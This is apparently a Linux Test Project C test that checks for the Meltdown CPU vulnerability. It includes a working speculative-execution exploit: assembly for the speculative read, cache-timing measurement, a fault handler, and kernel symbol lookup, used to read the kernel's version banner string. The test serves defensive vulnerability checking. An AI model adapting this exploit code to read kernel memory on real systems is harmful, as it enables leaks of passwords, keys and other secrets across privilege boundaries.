/*
 * Copyright (c) 2018 Pavel Boldin <pboldin@cloudlinux.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 *
 * Original exploit: https://github.com/paboldin/meltdown-exploit.
 */

#include "config.h"
#include "tst_test.h"

#if defined(__x86_64__) || defined(__i386__)

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/utsname.h>

#include <emmintrin.h>

#include "libtsc.h"

#define TARGET_OFFSET	9
#define TARGET_SIZE	(1 << TARGET_OFFSET)
#define BITS_BY_READ	2

static char target_array[BITS_BY_READ * TARGET_SIZE];

static void
clflush_target(void)
{
	int i;

	for (i = 0; i < BITS_BY_READ; i++)
		_mm_clflush(&target_array[i * TARGET_SIZE]);
}

extern char failshere[];
extern char stopspeculate[];

static void __attribute__((noinline))
speculate(unsigned long addr, char bit)
{
	register char mybit asm ("cl") = bit;
#ifdef __x86_64__
	asm volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n"

		"failshere:\n\t"
		"movb (%[addr]), %%al\n\t"
		"ror %[bit], %%rax\n\t"
		"and $1, %%rax\n\t"
		"shl $9, %%rax\n\t"
		"jz 1b\n\t"

		"movq (%[target], %%rax, 1), %%rbx\n"

		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr),
		  [bit] "r" (mybit)
		: "rax", "rbx"
	);
#else /* defined(__x86_64__) */
	asm volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%eax\n\t"
		".endr\n"

		"failshere:\n\t"
		"movb (%[addr]), %%al\n\t"
		"ror %[bit], %%eax\n\t"
		"and $1, %%eax\n\t"
		"shl $9, %%eax\n\t"
		"jz 1b\n\t"

		"movl (%[target], %%eax, 1), %%ebx\n"

		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr),
		  [bit] "r" (mybit)
		: "rax", "ebx"
	);
#endif
}

#ifdef __i386__
# define REG_RIP	REG_EIP
#endif

static void
sigsegv(int sig LTP_ATTRIBUTE_UNUSED,
	siginfo_t *siginfo LTP_ATTRIBUTE_UNUSED,
	void *context LTP_ATTRIBUTE_UNUSED)
{
	ucontext_t *ucontext = context;
	unsigned long *prip = (unsigned long *)&ucontext->uc_mcontext.gregs[REG_RIP];
	if (*prip != (unsigned long)failshere) {
		tst_brk(TBROK,
			"Segmentation fault at unexpected location %lx",
			*prip);
		abort();
	}
	*prip = (unsigned long)stopspeculate;
	return;
}

static int
set_signal(void)
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};

	return sigaction(SIGSEGV, &act, NULL);
}

static inline int
get_access_time(volatile char *addr)
{
	unsigned long long time1, time2;
	volatile int j LTP_ATTRIBUTE_UNUSED;

	rdtscll(time1);

	j = *addr;

	_mm_mfence();
	rdtscll(time2);

	return time2 - time1;
}

static int cache_hit_threshold;
static int hist[BITS_BY_READ];

static void
check(void)
{
	int i, time;
	volatile char *addr;

	for (i = 0; i < BITS_BY_READ; i++) {
		addr = &target_array[i * TARGET_SIZE];

		time = get_access_time(addr);

		if (time <= cache_hit_threshold)
			hist[i]++;
	}
}

#define CYCLES 10000
static int
readbit(int fd, unsigned long addr, char bit)
{
	int i, ret;
	static char buf[256];

	memset(hist, 0, sizeof(hist));

	for (i = 0; i < CYCLES; i++) {
		ret = pread(fd, buf, sizeof(buf), 0);
		if (ret < 0)
			tst_res(TBROK | TERRNO, "can't read /proc/version");

		clflush_target();

		speculate(addr, bit);
		check();
	}

#ifdef DEBUG
	for (i = 0; i < BITS_BY_READ; i++)
		tst_res(TINFO, "addr %lx hist[%x] = %d", addr, i, hist[i]);
#endif

	if (hist[1] > CYCLES / 10)
		return 1;
	return 0;
}

static int
readbyte(int fd, unsigned long addr)
{
	int bit, res = 0;

	for (bit = 0; bit < 8; bit ++ )
		res |= (readbit(fd, addr, bit) << bit);

	return res;
}


static int
mysqrt(long val)
{
	int root = val / 2, prevroot = 0, i = 0;

	while (prevroot != root && i++ < 100) {
		prevroot = root;
		root = (val / root + root) / 2;
	}

	return root;
}

#define ESTIMATE_CYCLES	1000000
static void
set_cache_hit_threshold(void)
{
	long cached, uncached, i;

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);

	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
		_mm_clflush(target_array);
		uncached += get_access_time(target_array);
	}

	cached /= ESTIMATE_CYCLES;
	uncached /= ESTIMATE_CYCLES;

	cache_hit_threshold = mysqrt(cached * uncached);

	tst_res(TINFO,
		"access time: cached = %ld, uncached = %ld, threshold = %d",
		cached, uncached, cache_hit_threshold);
}

static unsigned long
find_symbol_in_file(const char *filename, const char *symname)
{
	unsigned long addr;
	char type;
	int ret, read;
	char fmt[strlen(symname) + 64];

	sprintf(fmt, "%%lx %%c %s%%c", symname);

	ret = SAFE_FILE_LINES_SCANF(filename, fmt, &addr, &type, &read);
	if (ret)
		return 0;

	return addr;
}

static unsigned long
find_kernel_symbol(const char *name)
{
	char systemmap[256];
	struct utsname utsname;
	unsigned long addr;

	addr = find_symbol_in_file("/proc/kallsyms", name);
	if (addr)
		return addr;

	tst_res(TINFO, "not found '%s' in /proc/kallsyms", name);
	if (uname(&utsname) < 0)
		tst_brk(TBROK | TERRNO, "uname");

	sprintf(systemmap, "/boot/System.map-%s", utsname.release);

	tst_res(TINFO, "looking in '%s'\n", systemmap);
	addr = find_symbol_in_file(systemmap, name);
	return addr;
}

unsigned long linux_proc_banner_addr;
int banner_fd;

static void setup(void)
{
	set_cache_hit_threshold();

	linux_proc_banner_addr = find_kernel_symbol("linux_proc_banner");
	tst_res(TINFO, "linux_proc_banner is at %lx", linux_proc_banner_addr);

	banner_fd = SAFE_OPEN("/proc/version", O_RDONLY);

	memset(target_array, 1, sizeof(target_array));

	if (set_signal() < 0)
		tst_res(TBROK | TERRNO, "set_signal");
}

static void run(void)
{
	unsigned int i, score, ret;
	static char expected[] = "%s version %s";
	static char read[32];
	unsigned long addr = linux_proc_banner_addr;
	unsigned long size = sizeof(expected) - 1;

	for (i = 0; i < size; i++) {
		ret = readbyte(banner_fd, addr);

		read[i] = ret;
		tst_res(TINFO, "read %lx = 0x%x %c", addr, ret,
			isprint(ret) ? ret : ' ');

		addr++;
	}

	for (score = 0, i = 0; i < size; i++)
		if (expected[i] == read[i])
			score++;

	if (score > size / 2)
		tst_res(TFAIL, "I was able to read your kernel memory!!!");
	else
		tst_res(TPASS, "I was not able to read your kernel memory");
}

static void cleanup(void)
{
	SAFE_CLOSE(banner_fd);
}

static struct tst_test test = {
	.needs_root = 1,
	.setup = setup,
	.test_all = run,
	.cleanup = cleanup,
	.min_kver = "2.6.32"
};

#else /* #if defined(__x86_64__) || defined(__i386__) */

TST_TEST_TCONF("not x86_64 or i386");

#endif /* #else #if defined(__x86_64__) || defined(__i386__) */
